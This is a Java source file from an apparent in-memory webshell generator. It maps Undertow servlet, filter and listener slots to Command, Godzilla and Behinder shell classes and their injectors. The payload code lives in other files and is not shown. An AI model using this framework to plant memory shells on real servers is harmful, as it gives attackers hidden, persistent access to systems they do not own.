package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.Constants;
import com.reajason.javaweb.memshell.config.ShellTool;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.undertow.behinder.BehinderListener;
import com.reajason.javaweb.memshell.undertow.command.CommandListener;
import com.reajason.javaweb.memshell.undertow.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.undertow.injector.UndertowFilterInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowListenerInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowServletInjector;
import org.apache.commons.lang3.tuple.Pair;

import java.util.List;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class UndertowShell extends AbstractShell {

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Map.of(
                Constants.SERVLET, Pair.of(CommandServlet.class, UndertowServletInjector.class),
                Constants.JAKARTA_SERVLET, Pair.of(CommandServlet.class, UndertowServletInjector.class),
                Constants.FILTER, Pair.of(CommandFilter.class, UndertowFilterInjector.class),
                Constants.JAKARTA_FILTER, Pair.of(CommandFilter.class, UndertowFilterInjector.class),
                Constants.LISTENER, Pair.of(CommandListener.class, UndertowListenerInjector.class),
                Constants.JAKARTA_LISTENER, Pair.of(CommandListener.class, UndertowListenerInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Map.of(
                Constants.SERVLET, Pair.of(GodzillaServlet.class, UndertowServletInjector.class),
                Constants.JAKARTA_SERVLET, Pair.of(GodzillaServlet.class, UndertowServletInjector.class),
                Constants.FILTER, Pair.of(GodzillaFilter.class, UndertowFilterInjector.class),
                Constants.JAKARTA_FILTER, Pair.of(GodzillaFilter.class, UndertowFilterInjector.class),
                Constants.LISTENER, Pair.of(GodzillaListener.class, UndertowListenerInjector.class),
                Constants.JAKARTA_LISTENER, Pair.of(GodzillaListener.class, UndertowListenerInjector.class)
        );
    }

    @Override
    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Map.of(
                Constants.SERVLET, Pair.of(BehinderServlet.class, UndertowServletInjector.class),
                Constants.JAKARTA_SERVLET, Pair.of(BehinderServlet.class, UndertowServletInjector.class),
                Constants.FILTER, Pair.of(BehinderFilter.class, UndertowFilterInjector.class),
                Constants.JAKARTA_FILTER, Pair.of(BehinderFilter.class, UndertowFilterInjector.class),
                Constants.LISTENER, Pair.of(BehinderListener.class, UndertowListenerInjector.class),
                Constants.JAKARTA_LISTENER, Pair.of(BehinderListener.class, UndertowListenerInjector.class)
        );
    }
}
